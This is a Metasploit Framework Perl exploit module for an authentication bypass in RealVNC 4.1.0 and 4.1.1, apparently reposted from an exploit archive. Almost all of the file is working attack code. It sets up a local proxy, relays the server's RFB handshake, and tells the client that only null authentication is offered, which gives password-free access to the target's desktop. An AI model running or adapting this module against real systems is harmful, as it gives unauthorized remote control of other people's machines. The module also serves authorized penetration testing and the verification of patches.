RealVNC 4.1.0 - 4.1.1 (Null Authentication) Auth Bypass Exploit (meta)
======================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::realvnc_41_bypass;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use POSIX;

my $advanced = {};
my $info =
  {
	&#039;Name&#039;           => &#039;RealVNC 4.1 Authentication Bypass&#039;,
	&#039;Version&#039;        => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039;        => [ &#039;H D Moore <hdm[at]metasploit.com>&#039; ],
	&#039;Description&#039;    =>
	  Pex::Text::Freeform(qq{
		This module exploits an authentication bypass flaw in version
	4.1.0 and 4.1.1 of the RealVNC service. This module acts as a proxy
	between a VNC client and a vulnerable server. Credit for this should
	go to James Evans, who spent the time to figure this out after RealVNC
	released a binary-only patch.
}),

	&#039;Arch&#039;           => [  ],
	&#039;OS&#039;             => [  ],
	&#039;Priv&#039;           => 0,

	&#039;UserOpts&#039;       =>
	  {
		&#039;LPORT&#039;   => [ 1, &#039;PORT&#039;, &#039;The local VNC listener port&#039;,  5900      ],
		&#039;LHOST&#039;   => [ 1, &#039;HOST&#039;, &#039;The local VNC listener host&#039;, "0.0.0.0"  ],
		&#039;RPORT&#039;   => [ 1, &#039;PORT&#039;, &#039;The remote VNC target port&#039;, 5900      ],
		&#039;RHOST&#039;   => [ 1, &#039;HOST&#039;, &#039;The remote VNC target host&#039;],
		&#039;AUTOCONNECT&#039; => [1, &#039;DATA&#039;, &#039;Automatically launch vncviewer&#039;, 1],
	  },

	&#039;Refs&#039;            =>
	  [
		[&#039;URL&#039;, &#039;http://secunia.com/advisories/20107/&#039;]
	  ],

	&#039;DefaultTarget&#039;  => 0,
	&#039;Targets&#039;        =>
	  [
		[ &#039;RealVNC&#039; ],
	  ],

	&#039;Keys&#039;           => [ &#039;realvnc&#039; ],

	&#039;DisclosureDate&#039; => &#039;May 15 2006&#039;,
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			&#039;Info&#039;     => $info,
			&#039;Advanced&#039; => $advanced,
		},
		@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar(&#039;LHOST&#039;),
		LocalPort => $self->GetVar(&#039;LPORT&#039;),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => &#039;tcp&#039;);
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local VNC listener on " . $self->GetVar(&#039;SSHDPORT&#039;));
		return;
	}

	if ($self->GetVar(&#039;AUTOCONNECT&#039;) =~ /^(T|Y|1)/i) {
    	if (! fork()) {
        	system("vncviewer 127.0.0.1::".$self->GetVar(&#039;LPORT&#039;));
        	exit(0);
    	}		
	}

	$self->PrintLine("[*] Waiting for VNC connections to " . $self->GetVar(&#039;LHOST&#039;) . ":" . $self->GetVar(&#039;LPORT&#039;) . "...");

	while (defined($client = $server->accept()))
	{
		$self->HandleVNCClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

# Stolen from InjectVNCStage.pm
sub HandleVNCClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $rhost;
	my $rport;

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	# Create a connection to the target system
	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039; => $self->GetVar(&#039;RHOST&#039;),
		&#039;PeerPort&#039; => $self->GetVar(&#039;RPORT&#039;),
		&#039;SSL&#039;      => $self->GetVar(&#039;SSL&#039;)
	);
	
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Could not connect to the target VNC service: &#039; . $s->GetError);
		$fd->Close;
		return;
	}
	
	my $res = $s->Recv(-1, 5);
	
	# Hello from server
	if ($res !~ /^RFB 003\.008/) {
		$self->PrintLine("[*] The remote VNC service is not vulnerable");
		$fd->Close;
		$s->Close;
		return;
	}
	# Send it to the client
	$fd->Send($res);
	
	# Hello from client
	$res = $fd->Recv(-1, 5);
	if ($res !~ /^RFB /) {
		$self->PrintLine("[*] The local VNC client appears to be broken");
		$fd->Close;
		$s->Close;
		return;
	}
	# Send it to the server
	$s->Send($res);
	
	# Read the authentication methods from the server
	$res = $s->Recv(-1, 5);
	
	# Tell the client that the server only supports NULL auth
	$fd->Send("\x01\x01");
	
	# Start pumping data between the client and server
	if (! fork()) {
		$self->PrintLine("[*] Proxying data between the connections...");
		$self->VNCProxy($s->Socket, $fd->Socket);
		exit(0);
	}
	return;
}

sub VNCProxy {
  my $self = shift;
  my $srv = shift;
  my $cli = shift;

  foreach ($srv, $cli) {
    $_->blocking(1);
    $_->autoflush(1);
  }

  my $selector = IO::Select->new($srv, $cli);

  LOOPER:
    while(1) {
      my @ready = $selector->can_read;
      foreach my $ready (@ready) {
        if($ready == $cli) {
          my $data;
          $cli->recv($data, 8192);
          last LOOPER if (! length($data));     
          last LOOPER if(!$srv || !$srv->connected);
          eval { $srv->send($data); };
          last LOOPER if $@;
        }
        elsif($ready == $srv) {
          my $data;
          $srv->recv($data, 8192);
          last LOOPER if(!length($data));
          last LOOPER if(!$cli || !$cli->connected);
          eval { $cli->send($data); };
          last LOOPER if $@;
        }
      }
    }
}


1;



